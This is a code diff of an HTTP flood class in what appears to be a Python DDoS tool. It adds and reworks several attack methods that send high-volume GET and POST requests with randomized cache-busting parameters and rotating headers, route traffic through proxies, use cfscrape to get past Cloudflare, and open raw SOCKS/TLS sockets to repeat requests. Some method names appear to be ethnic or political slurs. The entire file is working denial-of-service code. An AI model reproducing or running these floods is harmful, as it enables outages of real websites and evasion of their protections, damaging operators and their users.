+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     if pro:
@@ -1296,17 +1065,18 @@ class HttpFlood(Thread):
                             continue
             except:
                 sleep(random.randint(10,15))
-            finally:
-                Tools.safe_close(s)
+        Tools.safe_close(s)
 
     def CFTANKIE2(self):
         global REQUESTS_SENT, BYTES_SEND
-        
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
         s = None
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     with s.get(str(self._target), timeout=200) as res:
@@ -1317,8 +1087,52 @@ class HttpFlood(Thread):
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
                 sleep(random.randint(1,10))
-            finally:
-                Tools.safe_close(s)
+        Tools.safe_close(s)
+
+    def CFTANKIE3(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    if pro:
+                        with s.get(socket.gethostbyname(str(self._target)) + "?=" + str(random.randint(0,20000)),
+                                   proxies=pro.asRequest(), timeout=15) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def CFTANKIE4(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    print(socket.gethostbyname(str(self._target)))
+                    with s.get("http://" + socket.gethostbyname(str(self._target)), timeout=15) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.post("http://" + socket.gethostbyname(str(self._target)) + "?=" + str(random.randint(0,20000)), timeout=15) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
 
     def TANKIE_SPECIAL(self):
         attack_method = int(random.randint(0,2))
@@ -1330,19 +1144,190 @@ class HttpFlood(Thread):
         elif  attack_method == 2:
             self.CFTANKIE2()
 
+    def JINSANGPANG(self):
+        global REQUESTS_SENT, BYTES_SEND
+
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Sec-Fetch-Dest": "document",
+        }
+
+        attack_header = int(random.randint(0,5))
+
+        if attack_header == 0:
+            headersx["Accept-Encoding"] = "gzip"
+        elif attack_header == 1:
+            headersx["Accept-Encoding"] = "compress"
+        elif attack_header == 2:
+            headersx["Accept-Encoding"] = "br"
+        elif attack_header == 3:
+            headersx["Accept-Encoding"] = "deflate"
+        else:
+            headersx["Accept-Encoding"] = "gzip, compress, br, deflate"
+
+        attack_header = int(random.randint(0,5))
+
+        if attack_header == 0:
+            headersx["Cache-Control"] = "max-age=0"
+        elif attack_header == 1:
+            headersx["Cache-Control"] = "no-cache"
+        elif attack_header == 2:
+            headersx["Cache-Control"] = "no-store"
+        elif attack_header == 3:
+            headersx["Cache-Control"] = "private"
+        elif attack_header == 4:
+            headersx["Cache-Control"] = "no-transform"
+        elif attack_header == 5:
+            headersx["Cache-Control"] = "only-if-cached"
+        else:
+            headersx["Cache-Control"] = "max-age=0"
+
+
+        attack_header = int(random.randint(0,7))
+
+        if attack_header == 0:
+            headersx["Accept-Language"] = "vi,en;q=0.9,en-US;q=0.8"
+        elif attack_header == 1:
+            headersx["Accept-Language"] = "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5"
+        elif attack_header == 2:
+            headersx["Accept-Language"] = "pl,ja;q=0.7,en;q=0.3"
+        elif attack_header == 3:
+            headersx["Accept-Language"] = "fr,es;q=0.7,ja;q=0.3"
+        elif attack_header == 4:
+            headersx["Accept-Language"] = "pl,de;q=0.7,ja;q=0.3"
+        elif attack_header == 5:
+            headersx["Accept-Language"] = "it,fr;q=0.5,pl;q=0.4"
+        elif attack_header == 6:
+            headersx["Accept-Language"] = "kr,cn;q=0.5,ja;q=0.4"
+        elif attack_header == 7:
+            headersx["Accept-Language"] = "ru,cn;q=0.5,kr;q=0.2"
+
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+
+                    random_lang = int(random.randint(0,3))
+                    target_lang = ""
+
+                    if random_lang == 0:
+                        target_lang = "jpn"
+                    elif random_lang == 1:
+                        target_lang = "rus"
+                    elif random_lang == 2:
+                        target_lang = "eng"
+                    elif random_lang == 3:
+                        target_lang = "chn"
+
+                    attack_method = int(random.randint(0,4))
+                    if self._rpc % attack_method == 0:
+                        with s.get(str(self._target) + "?lang="    + target_lang +
+                                                       "&ptype="   + Tools.randomname(int(random.randint(5,10))) + 
+                                                       "&stype="   + str(random.randint(0,10)) +
+                                                       "&ctype="   + str(random.randint(0,10)) +
+                                                       "&mtype="   + Tools.randomname(int(random.randint(5,10))) + 
+                                                       "&no="      + str(random.randint(0,200)) 
+                                                       ,headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 1:
+                        with s.get(str(self._target) + "?lang="    + target_lang +
+                                                       "&ptype="   + "cforep" + 
+                                                       "&stype="   + str(random.randint(0,10)) +
+                                                       "&ctype="   + str(random.randint(0,10)) +
+                                                       "&mtype="   + Tools.randomname(int(random.randint(5,10))) + 
+                                                       "&no="      + str(random.randint(0,200)) 
+                                                       ,headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 2:
+                        with s.get(str(self._target) + "?lang="    + target_lang +
+                                                       "&ptype="   + "cfopho" + 
+                                                       "&mtype="   + Tools.randomname(int(random.randint(5,10))) + 
+                                                       "&no="      + str(random.randint(0,200)) 
+                                                       ,headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 3:
+                        with s.get(str(self._target) + "?lang="    + target_lang +
+                                                       "&ptype="   + "csearch" + 
+                                                       "&skey="   + Tools.randomname(int(random.randint(5,10))) 
+                                                       ,headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 4:
+                        with s.get(str(self._target) + "?lang="    + target_lang +
+                                                       "&ptype="   + "cfoutv" + 
+                                                       "&mtype="   + Tools.randomname(int(random.randint(5,10))) + 
+                                                       "&no="      + str(random.randint(0,20)) 
+                                                       ,headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+
+            except:
+                sleep(random.randint(10,15))
+            finally:
+                Tools.safe_close(s)
+
+    def RAGHED_TANKIE(self) -> None:
+
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(min(self._rpc, 5)):
+                    with s.get(str(self._target), timeout=200) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.post(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=200) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(1,2))
+        Tools.safe_close(s)
+
     def CFFUNDIE(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
+        "Sec-Fetch-Site": "same-origin"}
 
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     if pro:
@@ -1356,20 +1341,27 @@ class HttpFlood(Thread):
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(1,3))
-            finally:
-               Tools.safe_close(s)
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
 
     def CFFUNDIE2(self):
         global REQUESTS_SENT, BYTES_SEND
         s = None
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
+        "Sec-Fetch-Site": "same-origin"}
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     #http.request("GET", str(self._target), headers=headersx, timeout=60)
@@ -1381,9 +1373,8 @@ class HttpFlood(Thread):
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(1,3))
-            finally:
-               Tools.safe_close(s)
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
 
     def CFPAPIST(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1391,13 +1382,21 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
+        "Sec-Fetch-Site": "same-origin"}
 
         s = None
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     if pro:
@@ -1410,203 +1409,103 @@ class HttpFlood(Thread):
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
                 sleep(random.randint(10,15))
-            finally:
-               Tools.safe_close(s)
+        Tools.safe_close(s)
 
     def CFRAGHEAD(self):
         global REQUESTS_SENT, BYTES_SEND
-        
-        headersx = self.get_headersx()
+        s = None
 
-        with suppress(Exception), create_scraper() as s:
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        #http = urllib3.PoolManager()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "jp,vi,cn,en;q=0.9,en-US;q=0.8,en-UK;q=0.5",
+        "Sec-Fetch-Site": "same-origin"}
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     with s.get(str(self._target), headers=headersx, timeout=60) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def CFRAGHEAD2(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        #http = urllib3.PoolManager()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "jp,vi,cn,en;q=0.9,en-US;q=0.8,en-UK;q=0.5",
+        "Sec-Fetch-Site": "same-origin"}
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    sleep(max(self._rpc / 1000, 1))
+                    with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
                     with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                        BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(1,3))
-            finally:
-               Tools.safe_close(s)
-
-    def CFRAGHEAD2(self):
-        global REQUESTS_SENT, BYTES_SEND
-
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-
-        #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
-
-        with suppress(Exception), create_scraper() as s:
-            try:
-                for _ in range(self._rpc):
-                    sleep(max(self._rpc / 1000, 1))
-                    with s.get(str(self._target), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-            except:
-                sleep(random.randint(1,3))
-            finally:
-               Tools.safe_close(s)
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
 
     def CFRAGHEAD3(self):
         global REQUESTS_SENT, BYTES_SEND
-        
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-        with suppress(Exception), create_scraper() as s:
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
                     attack_method = int(random.randint(0,3))
                     if self._rpc % attack_method == 0:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
                     elif self._rpc % attack_method == 1:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
                     elif self._rpc % attack_method == 2:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
                     elif self._rpc % attack_method == 3:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
             except:
-                sleep(random.randint(1,3))
-            finally:
-                Tools.safe_close(s)
-
-    def CF_ATTACK_RAGHEAD(self):
-        global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-      
-        proxy = pro.ip_port().split(":")
-        req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
-        req += "Cache-Control: no-cache\r\n"
-        req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
-        req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-        req += "Sec-Fetch-Site: same-origin\r\n"
-        req += "Sec-GPC: 1\r\n"
-        req += "Sec-Fetch-Mode: navigate\r\n"
-        req += "Sec-Fetch-Dest: document\r\n"
-        req += "Upgrade-Insecure-Requests: 1\r\n"
-        req += "Connection: Keep-Alive\r\n\r\n"
-
-        for _ in range(self._rpc):
-            try:
-                with socks.socksocket() as s:
-                    s = socks.socksocket()
-                    s.connect((str(self._host), int(443)))
-                    s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._target)
-                    s.send(str.encode(req))
-                    try:
-                        ts = time()
-                        for _ in range(100):
-                            s.send(str.encode(req))
-                            s.send(str.encode(req))
-                            if time() > ts + 120: break
-                    except:
-                        sleep(random.randint(1,2))
-                    finally:
-                        pass
-            except:
-                pass
-            finally:
-                Tools.safe_close(s)
-
-    def CF_ATTACK_RAGHEAD2(self):
-        global REQUESTS_SENT, BYTES_SEND
-
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-
-        #http = urllib3.PoolManager()
-        headersx = self.get_headersx()
-
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-
-        with suppress(Exception), create_scraper() as s:
-            try:
-                sleep(5.01)
-                ts = time()
-                for _ in range(self._rpc):
-                    with s.get(str(self._target), proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                    if time() > ts + 120: break
-            except:
-                sleep(random.randint(1,3))
-            finally:
-               Tools.safe_close(s)
-
-
-    def CF_ATTACK_RAGHEAD3(self):
-        global REQUESTS_SENT, BYTES_SEND
-
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-
-        headersx = self.get_headersx()
-
-        with suppress(Exception), create_scraper() as s:
-            try:
-                sleep(5.01)
-                ts = time()
-                for _ in range(self._rpc):
-                    attack_method = int(random.randint(0,3))
-                    if self._rpc % attack_method == 0:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), headers=headersx, timeout=60) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SEND += Tools.sizeOfRequest(res)
-                            continue
-                    elif self._rpc % attack_method == 1:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), headers=headersx, timeout=60) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SEND += Tools.sizeOfRequest(res)
-                            continue
-                    elif self._rpc % attack_method == 2:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), headers=headersx, timeout=60) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SEND += Tools.sizeOfRequest(res)
-                            continue
-                    elif self._rpc % attack_method == 3:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), headers=headersx, timeout=60) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SEND += Tools.sizeOfRequest(res)
-                            continue
-                    if time() > ts + 120: break
-            except:
-                sleep(5.01)
+                sleep(random.randint(1,5))
             finally:
                 Tools.safe_close(s)
 
@@ -1620,10 +1519,10 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         # Attacking
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                for _ in range(self._rpc):
                     if pro:
@@ -1635,9 +1534,8 @@ class HttpFlood(Thread):
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(1,5))
-            finally:
-               Tools.safe_close(s)
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
 
     def LOIC(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1742,7 +1640,7 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
       
         proxy = pro.ip_port().split(":")
-        req =  "GET / HTTP/1.1\r\nHost: " + self._host + "\r\n"
+        req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
         req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -1752,23 +1650,21 @@ class HttpFlood(Thread):
         req += "Sec-Fetch-Dest: document\r\n"
         req += "Upgrade-Insecure-Requests: 1\r\n"
         req += "Connection: Keep-Alive\r\n\r\n"
-        for _ in range(self._rpc):
+        try:
+            s = socks.socksocket()
+            s.connect((str(self._host), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
             try:
-                with socks.socksocket() as s:
-                    s = socks.socksocket()
-                    s.connect((str(self._host), int(443)))
-                    s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._host)
+                for _ in range(self._rpc):
                     s.send(str.encode(req))
-                    try:
-                        for _ in range(100):
-                            s.send(str.encode(req))
-                            s.send(str.encode(req))
-                    except:
-                        s.close()
+                    s.send(str.encode(req))
             except:
                 s.close()
+        except:
+            s.close()
 
     def KACAP(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1777,7 +1673,7 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        headersx={"Host" : str(self._target),
+        headersx={"Host" : str(self._host),
         "Connection" : "keep-alive",
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
@@ -1789,9 +1685,10 @@ class HttpFlood(Thread):
         # Attacking
         try:
            for _ in range(self._rpc):
+               requests.get(url, headers=headersx)
                requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
         except:
-            sleep(random.randint(1,3))
+            sleep(random.randint(10,15))
 
     def AMAMI_CANON(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1800,96 +1697,122 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        headersx = self.get_headersx()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Sec-Fetch-Dest": "document",
+        }
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+        attack_header = int(random.randint(0,5))
 
-        scraper = None
+        if attack_header == 0:
+            headersx["Accept-Encoding"] = "gzip"
+        elif attack_header == 1:
+            headersx["Accept-Encoding"] = "compress"
+        elif attack_header == 2:
+            headersx["Accept-Encoding"] = "br"
+        elif attack_header == 3:
+            headersx["Accept-Encoding"] = "deflate"
+        else:
+            headersx["Accept-Encoding"] = "gzip, compress, br, deflate"
+
+        attack_header = int(random.randint(0,5))
+
+        if attack_header == 0:
+            headersx["Cache-Control"] = "max-age=0"
+        elif attack_header == 1:
+            headersx["Cache-Control"] = "no-cache"
+        elif attack_header == 2:
+            headersx["Cache-Control"] = "no-store"
+        elif attack_header == 3:
+            headersx["Cache-Control"] = "private"
+        elif attack_header == 4:
+            headersx["Cache-Control"] = "no-transform"
+        elif attack_header == 5:
+            headersx["Cache-Control"] = "only-if-cached"
+        else:
+            headersx["Cache-Control"] = "max-age=0"
+
+
+        attack_header = int(random.randint(0,7))
+
+        if attack_header == 0:
+            headersx["Accept-Language"] = "vi,en;q=0.9,en-US;q=0.8"
+        elif attack_header == 1:
+            headersx["Accept-Language"] = "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5"
+        elif attack_header == 2:
+            headersx["Accept-Language"] = "pl,ja;q=0.7,en;q=0.3"
+        elif attack_header == 3:
+            headersx["Accept-Language"] = "fr,es;q=0.7,ja;q=0.3"
+        elif attack_header == 4:
+            headersx["Accept-Language"] = "pl,de;q=0.7,ja;q=0.3"
+        elif attack_header == 5:
+            headersx["Accept-Language"] = "it,fr;q=0.5,pl;q=0.4"
+        elif attack_header == 6:
+            headersx["Accept-Language"] = "kr,cn;q=0.5,ja;q=0.4"
+        elif attack_header == 7:
+            headersx["Accept-Language"] = "ru,cn;q=0.5,kr;q=0.2"
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
